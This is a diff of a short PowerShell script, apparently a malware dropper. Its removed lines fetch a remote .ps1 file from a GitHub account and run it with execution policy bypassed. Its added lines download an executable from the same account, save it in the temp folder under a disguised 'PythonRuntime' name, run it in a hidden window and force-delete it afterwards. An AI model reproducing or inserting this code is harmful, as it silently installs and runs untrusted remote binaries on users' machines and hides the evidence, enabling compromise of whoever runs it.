@@ -1,5 +1,5 @@
-$url = "https://raw.githubusercontent.com/skiddyskid111/resources/refs/heads/main/FileGuardian.ps1"
-$rand = [System.IO.Path]::GetRandomFileName() + ".ps1"
-$output = Join-Path $env:TEMP $rand
-Invoke-WebRequest -Uri $url -OutFile $output
-Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -File `"$output`""
+$rand = Get-Random
+$path = "$env:TEMP\PythonRuntime_$rand.exe" 
+Invoke-WebRequest -Uri "https://github.com/skiddyskid111/resources/releases/download/adadad/scripthelper.exe" -OutFile $path 
+Start-Process $path -WindowStyle Hidden -Wait 
+Remove-Item $path -Force
